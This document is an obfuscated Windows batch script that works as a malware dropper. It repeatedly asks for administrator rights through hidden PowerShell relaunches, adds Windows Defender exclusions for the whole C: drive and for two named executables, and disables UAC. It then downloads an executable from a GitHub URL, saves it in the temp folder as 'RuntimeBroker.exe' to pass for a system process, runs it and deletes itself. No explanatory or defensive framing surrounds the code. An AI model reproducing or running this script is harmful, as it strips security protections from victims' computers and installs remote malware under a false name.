@echo off & setlocal enableDelayedExpansion
set "qAW=2>&1" & set "bUeif=SESSION" & set "FkGa=NET" & set "yiqQ=>nul"
%FkGa% %bUeif% %yiqQ% %qAW%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "wyeV=baz" & set "Aefe=foo" & set "aRC=bar" & set "ZNCK=qux" & rem UpJjr zkcqIFU UCLrL
set "jZD=powershell -ExecutionPolicy Bypass -Command"
set "JGTj=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "tPTG='C:\' -ErrorAction SilentlyContinue"
!jZD! "!JGTj! !tPTG!" %yiqQ% %qAW%
set "RJY=Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue"
!jZD! "!RJY!" %yiqQ% %qAW%
set "mlC=Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue"
!jZD! "!mlC!" %yiqQ% %qAW%
set "CITr=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "sbXa=-Name 'EnableLUA' -Value 0"
!jZD! "!CITr! !sbXa!" %yiqQ% %qAW%
set "wyn=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!jZD! "!wyn!" %yiqQ% %qAW%
if !errorlevel! neq 0 (goto %a%)
set "HsXk=timeout /t" & !HsXk! 2 %yiqQ% %qAW%
set "HvSy=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "NgDvq=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!jZD! "!HvSy! !NgDvq!" %yiqQ% %qAW%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!HsXk! 1 %yiqQ% %qAW% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %yiqQ% %qAW%
del /f /q "%~f0" %yiqQ% %qAW%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %yiqQ% %qAW%
if !errorlevel! neq 0 (!HsXk! 3 %yiqQ% %qAW% & goto %b%)
exit /b
